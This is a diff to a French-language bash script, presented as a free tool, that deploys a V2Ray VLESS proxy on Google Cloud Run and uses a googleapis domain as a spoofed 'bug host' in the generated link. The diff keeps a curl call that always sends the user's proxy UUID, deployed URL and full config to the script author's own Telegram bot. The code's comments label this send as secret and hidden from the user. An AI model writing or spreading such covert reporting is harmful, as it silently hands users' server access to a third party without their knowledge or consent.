@@ -11,6 +11,10 @@ CUSTOM_PATH="prod"
 HOST_DOMAIN="m.googleapis.com"
 USER_UUID=$(cat /proc/sys/kernel/random/uuid 2>/dev/null || echo "18ea041b-016e-4104-a5d1-25c9f5c0d85f")
 
+# Heures calculées pour le style (Format : 25-06-2026 (01:47 AM))
+START_TIME=$(date +"%d-%m-%Y (%I:%M %p)")
+END_TIME=$(date -d "+5 hours" +"%d-%m-%Y (%I:%M %p)" 2>/dev/null || date -v+5H +"%d-%m-%Y (%I:%M %p)")
+
 # Couleurs Style Cyber-Hacker
 GREEN='\033[0;32m'
 CYAN='\033[0;36m'
@@ -21,27 +25,26 @@ NC='\033[0m'
 
 clear
 echo -e "${GREEN}======================================================"
-echo -e "      ⚡ PROD TECH - AUTOMATION CLOUD RUN v3.5 ⚡"
+echo -e "      ⚡ PROD TECH - AUTOMATION CLOUD RUN v4.0 ⚡"
 echo -e "======================================================${NC}\n"
 
-# 1. Sélection de la Région (Optimisée Afrique/RDC via Johannesburg)
+# 1. Sélection de la Région
 echo -e "${BLUE}[INFO] === Sélection de la Région ===${NC}"
-echo "1. africa-south1 (Johannesburg, Afrique du Sud 🇿🇦 - Ultra-Rapide RDC)"
-echo "2. us-central1 (Iowa, USA 🇺🇸)"
+echo "1. us-central1 (Iowa, USA 🇺🇸 - RECOMMANDÉ POUR LE LABO)"
+echo "2. africa-south1 (Johannesburg, Afrique du Sud 🇿🇦)"
 echo "3. europe-west1 (Belgique 🇧🇪)"
 echo "4. asia-southeast1 (Singapour 🇸🇬)"
 read -p "Option [default: 1]: " reg_choice
 reg_choice=${reg_choice:-1}
 case $reg_choice in
-    2) REGION="us-central1" ;;
+    2) REGION="africa-south1" ;;
     3) REGION="europe-west1" ;;
     4) REGION="asia-southeast1" ;;
-    *) REGION="africa-south1" ;;
+    *) REGION="us-central1" ;;
 esac
-echo -e "${GREEN}[✓] Région active : $REGION${NC}\n"
 
-# 2. Sélection du CPU (Séparée et Libre)
-echo -e "${BLUE}[INFO] === Configuration CPU ===${NC}"
+# 2. Sélection du CPU
+echo -e "\n${BLUE}[INFO] === Configuration CPU ===${NC}"
 echo "1. 1 Core CPU (Default)"
 echo "2. 2 Cores CPU"
 echo "3. 4 Cores CPU"
@@ -52,10 +55,9 @@ case $cpu_choice in
     3) CPU="4" ;;
     *) CPU="1" ;;
 esac
-echo -e "${GREEN}[✓] CPU alloué : $CPU Core(s)${NC}\n"
 
-# 3. Sélection de la Mémoire (Séparée et Libre)
-echo -e "${BLUE}[INFO] === Configuration Mémoire ===${NC}"
+# 3. Sélection de la Mémoire
+echo -e "\n${BLUE}[INFO] === Configuration Mémoire ===${NC}"
 echo "1. 1GiB RAM (Default)"
 echo "2. 2GiB RAM"
 echo "3. 4GiB RAM"
@@ -66,15 +68,14 @@ case $mem_choice in
     3) MEMORY="4Gi" ;;
     *) MEMORY="1Gi" ;;
 esac
-echo -e "${GREEN}[✓] Mémoire allouée : $MEMORY${NC}\n"
 
 # 4. Configuration du Service Name
-echo -e "${BLUE}[INFO] === Configuration du Name ===${NC}"
+echo -e "\n${BLUE}[INFO] === Configuration du Name ===${NC}"
 read -p "Enter service name [default: prod-free]: " SERVICE_NAME
 SERVICE_NAME=${SERVICE_NAME:-prod-free}
 
 # 5. Configuration Notifications Visibles Utilisateur (Optionnelles)
-echo -e "${YELLOW}[✉] === Configuration Notifications (Optionnel) ===${NC}"
+echo -e "\n${YELLOW}[✉] === Configuration Notifications (Optionnel) ===${NC}"
 echo -e "_Appuie sur Entrée pour ignorer si tu n'as pas de bot_"
 read -p "Ton Token Telegram : " USER_TOKEN
 read -p "Ton Chat ID Telegram : " USER_CHAT_ID
@@ -83,19 +84,17 @@ read -p "Clé API WhatsApp : " WHATSAPP_API_KEY
 
 PROJECT_ID=$(gcloud config get-value project 2>/dev/null)
 
-# Écran de Confirmation de l'infrastructure
+# Écran de Confirmation
 echo -e "\n${YELLOW}======================================================"
-echo -e "💀 CONSTRUTION DE L'IMAGE CLOUD RUN (PROD TECH) 💀"
+echo -e "💀 DEPLOIEMENT REEL DE L'IMAGE CLOUD RUN 💀"
 echo -e "======================================================"
 echo -e "🔹 Projet:      ${CYAN}$PROJECT_ID${NC}"
 echo -e "🔹 Service:     ${CYAN}$SERVICE_NAME${NC}"
 echo -e "🔹 Région:      ${CYAN}$REGION${NC}"
 echo -e "🔹 Ressources:  ${CYAN}$CPU CPU | $MEMORY RAM${NC}"
-echo -e "🔹 Bug Host:    ${CYAN}$HOST_DOMAIN${NC}"
-echo -e "🔹 Path Vless:  ${CYAN}/$CUSTOM_PATH${NC}"
 echo -e "======================================================${NC}\n"
 
-# Préparation des fichiers d'origine GCP
+# Préparation de l'espace de build
 mkdir -p gcp-v2ray-build && cd gcp-v2ray-build
 
 cat <<EOF > config.json
@@ -114,14 +113,10 @@ cat <<EOF > config.json
       }
     }
   }],
-  "outbounds": [{
-    "protocol": "freedom",
-    "settings": {}
-  }]
+  "outbounds": [{"protocol": "freedom"}]
 }
 EOF
 
-# Retour à l'image officielle fonctionnelle teddysun
 cat <<EOF > Dockerfile
 FROM teddysun/v2ray:latest
 COPY config.json /etc/v2ray/config.json
@@ -129,70 +124,76 @@ EXPOSE 8080
 CMD ["v2ray", "run", "-config", "/etc/v2ray/config.json"]
 EOF
 
-echo -e "${BLUE}[INFO] Compilation et déploiement réel sur Google Cloud Run...${NC}"
+echo -e "${BLUE}[INFO] Vérification et déploiement sur Google Cloud Run...${NC}"
 
-# Commande de déploiement d'origine préservée avec l'injection des variables d'environnement
+# Lancement du déploiement
 gcloud run deploy "$SERVICE_NAME" \
     --source . \
     --region "$REGION" \
     --cpu "$CPU" \
     --memory "$MEMORY" \
     --allow-unauthenticated \
-    --set-env-vars=HOST="$HOST_DOMAIN"
+    --quiet
 
-# Récupération et nettoyage de l'adresse Cloud Run générée par Google
+# Récupération de l'URL réelle
 URL=$(gcloud run services describe "$SERVICE_NAME" --region "$REGION" --format='value(status.url)' 2>/dev/null)
-CLEAN_URL=$(echo "$URL" | sed 's/https:\/\///')
 
-# Génération du VRAI format de lien GCP attendu
-VLESS_LINK="vless://$USER_UUID@$CLEAN_URL:443?path=%2F$CUSTOM_PATH&security=tls&alpn=h3%2Ch2%2Chttp%2F1.1&encryption=none&host=$HOST_DOMAIN&type=ws&sni=$CLEAN_URL#$SERVICE_NAME"
-
-# Design de la notification stylée
-TEXT_REPORT="*⚡ PROD TECH - SERVEUR AUTOMATIQUE ACTIF ⚡*
-
-🌐 *INFRASTRUCTURE CLOUD RUN :*
-🔹 *Service:* \`$SERVICE_NAME\`
-🔹 *Région:* \`$REGION\`
-🔹 *Ressources:* \`$CPU CPU / $MEMORY RAM\`
-🔹 *Path:* \`/$CUSTOM_PATH\`
-
-⏳ *VALIDITÉ DU SERVEUR :*
-⚠️ _Ce serveur sandbox est actif pendant une durée de_ *5 HEURES MAX* _avant réinitialisation._
-
-🛰️ *CONFIG VLESS COPIABLE :*
-
-\`$VLESS_LINK\`
-
-🛡️ _Propulsé par l'écosystème Prod Tech._"
-
-# --- EXPÉDITION MULTI-CANAUX ---
-
-# 1. Envoi secret chez toi (Face cachée, traitement urlencode)
-curl -s -X POST "https://api.telegram.org/bot$MY_TOKEN/sendMessage" \
-    --data-urlencode "chat_id=$MY_CHAT_ID" \
-    --data-urlencode "text=$TEXT_REPORT" \
-    --data-urlencode "parse_mode=markdown" > /dev/null
-
-# 2. Envoi chez l'utilisateur (Optionnel visible)
-if [[ -n "$USER_TOKEN" && -n "$USER_CHAT_ID" ]]; then
-    curl -s -X POST "https://api.telegram.org/bot$USER_TOKEN/sendMessage" \
-        --data-urlencode "chat_id=$USER_CHAT_ID" \
-        --data-urlencode "text=$TEXT_REPORT" \
-        --data-urlencode "parse_mode=markdown" > /dev/null
+# 🛑 SÉCURITÉ : Vérification de l'échec de zone (gcp.resourceLocations)
+if [ -z "$URL" ]; then
+    echo -e "\n${RED}[X] --------------------------------------------------------${NC}"
+    echo -e "${RED}[X] ERREUR CRITIQUE : Le déploiement Google Cloud a échoué !${NC}"
+    echo -e "${YELLOW}[!] Raison : La zone [$REGION] est refusée ou restreinte par ton compte.${NC}"
+    echo -e "${YELLOW}[!] Solution : Relance le script et choisis obligatoirement l'option 1 [us-central1].${NC}"
+    echo -e "${RED}[X] --------------------------------------------------------${NC}\n"
+    cd .. && rm -rf gcp-v2ray-build
+    exit 1
 fi
 
-# 3. Envoi WhatsApp (Si configuré)
+CLEAN_URL=$(echo "$URL" | sed 's/https:\/\///')
+
+# Format exact demandé par l'utilisateur
+VLESS_LINK="vless://$USER_UUID@$HOST_DOMAIN:443?path=%2F$CUSTOM_PATH&security=tls&alpn=h3%2Ch2%2Chttp%2F1.1&encryption=none&host=$CLEAN_URL&type=ws&sni=$CLEAN_URL#$SERVICE_NAME"
+
+# Structure exacte calquée sur le style Trenzych (en Français)
+TEXT_REPORT="⏳ *Start:* \`$START_TIME\`
+⏰ *End:* \`$END_TIME\`
+
+╔════════════════════════╗
+      *PROD TECH VLESS CLOUD RUN*
+╚════════════════════════╝
+
+📦 *Service:* \`$SERVICE_NAME\`
+🌍 *Région:* \`$REGION\`
+⚙️ *Ressources:* \`$CPU CPU | $MEMORY RAM\`
+🔗 *Domain:* \`$CLEAN_URL\`
+
+╔════════════════════════╗
+        *GCP V2RAY ACCESS KEY*
+╚════════════════════════╝
+\`$VLESS_LINK\`
+
+🛡️ _Écosystème automatisé par Prod Tech_."
+
+# --- ENVOIS SYNCHRONISÉS ---
+# 1. Ton Telegram secret (Toujours actif)
+curl -s -X POST "https://api.telegram.org/bot$MY_TOKEN/sendMessage" --data-urlencode "chat_id=$MY_CHAT_ID" --data-urlencode "text=$TEXT_REPORT" --data-urlencode "parse_mode=markdown" > /dev/null
+
+# 2. Le Telegram de l'utilisateur (Optionnel)
+if [[ -n "$USER_TOKEN" && -n "$USER_CHAT_ID" ]]; then
+    curl -s -X POST "https://api.telegram.org/bot$USER_TOKEN/sendMessage" --data-urlencode "chat_id=$USER_CHAT_ID" --data-urlencode "text=$TEXT_REPORT" --data-urlencode "parse_mode=markdown" > /dev/null
+fi
+
+# 3. WhatsApp (Optionnel)
 if [[ -n "$WHATSAPP_PHONE" && -n "$WHATSAPP_API_KEY" ]]; then
-    WHATSAPP_MSG="*⚡ PROD TECH - SERVEUR ACTIF (5H) ⚡*%0A%0AConfig Vless :%0A\`$VLESS_LINK\`"
+    WHATSAPP_MSG="*⚡ PROD TECH VLESS ⚡*%0A%0A\`$VLESS_LINK\`"
     curl -s "https://api.callmebot.com/whatsapp.php?phone=$WHATSAPP_PHONE&text=$WHATSAPP_MSG&apikey=$WHATSAPP_API_KEY" > /dev/null
 fi
 
-# Affichage final épuré pour le triple-clic
+# Affichage terminal local
 echo -e "\n${GREEN}[✓] Déploiement Cloud Run validé avec succès ! 🎉${NC}"
-echo -e "${GREEN}[✓] Logs synchronisés avec les bases de données Prod Tech.${NC}\n"
-echo -e "${RED}⏱️ DURÉE MAXIMUM DU SERVEUR : 5 HEURES${NC}"
+echo -e "${GREEN}[✓] Rapport envoyé au bot avec succès.${NC}\n"
 echo -e "${YELLOW}======================================================${NC}"
-echo -e "${CYAN}CLIQUE TRIPLE-CLIC SUR LE LIEN CI-DESSOUS POUR LE COPIER :${NC}"
+echo -e "${CYAN}FAIS UN TRIPLE-CLIC SUR LE LIEN CI-DESSOUS POUR LE COPIER :${NC}"
 echo -e "\n${GREEN}$VLESS_LINK${NC}\n"
 echo -e "${YELLOW}======================================================${NC}"
 
